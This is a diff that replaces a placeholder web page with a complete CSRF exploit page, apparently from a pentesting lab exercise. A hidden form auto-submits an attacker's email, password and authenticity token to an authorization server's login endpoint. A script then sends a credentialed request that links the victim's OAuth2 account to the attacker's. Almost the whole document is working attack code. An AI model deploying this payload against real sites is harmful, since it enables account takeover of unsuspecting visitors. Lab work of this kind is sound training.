@@ -1,11 +1,64 @@
-<html>
-<head>
-<a href="https://google.com"></a>
-
-
-</head>
 <body>
-  <h1>hello </h1>
-  <p>this is our awesome website </p>
+    <h1>CSRF Exploitation Exercise</h1>
+
+    <!-- Form to login the client to the authorization server -->
+    <form id="loginForm" action="http://authorization-ptl-321a551d9f0a-85fdaa8ec994.libcurl.me/users/sign_in" method="POST" style="display:none;">
+        <input type="hidden" name="utf8" value="✓">
+        <input type="hidden" name="authenticity_token" value="yoWW3aB08F6T8vOg4ZE41q3QF4xFmm+hRx0qSrdWb60Bw9rSLcylmGm0hLAy1VuSIMxt+ZykJZwuCmPZLlLgeQ==">
+        <input type="hidden" name="user[email]" value="attacker@mail.com">
+        <input type="hidden" name="user[password]" value="sK!x!pdbQ=4Kq8$">
+        <input type="hidden" name="user[remember_me]" value="0">
+        <input type="hidden" name="commit" value="Log in">
+    </form>
+
+    <iframe id="authFrame" style="display:none;"></iframe>
+    <iframe id="clientFrame" style="display:none;"></iframe>
+
+    <script>
+        // Auto-submit the login form
+        document.getElementById('loginForm').submit();
+
+        // Function to send a GET request to the specified URL
+        function performOAuth2Linking() {
+            fetch('http://ptl-321a551d9f0a-85fdaa8ec994.libcurl.me/users/auth/myprovider', {
+                method: 'GET',
+                credentials: 'include' // Ensure cookies are sent with the request
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('OAuth2 linking successful:', data);
+                alert('OAuth2 linking successful!');
+            })
+            .catch(error => {
+                console.error('Error during OAuth2 linking:', error);
+                alert('Error during OAuth2 linking!');
+            });
+        }
+
+        // Function to check if login was successful
+        function checkLoginStatus() {
+            fetch('http://authorization-ptl-321a551d9f0a-85fdaa8ec994.libcurl.me/', {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                if (data.includes('Logout') || data.includes('Welcome')) { // Adjust this check based on the actual response
+                    console.log('Login successful, proceeding to OAuth2 linking');
+                    performOAuth2Linking();
+                } else {
+                    console.error('Login not successful, retrying...');
+                    setTimeout(checkLoginStatus, 3000);
+                }
+            })
+            .catch(error => {
+                console.error('Error checking login status:', error);
+                setTimeout(checkLoginStatus, 3000);
+            });
+        }
+
+        // Set a delay before checking login status
+        setTimeout(checkLoginStatus, 3000); // Adjust the delay as needed
+    </script>
 </body>
 </html>
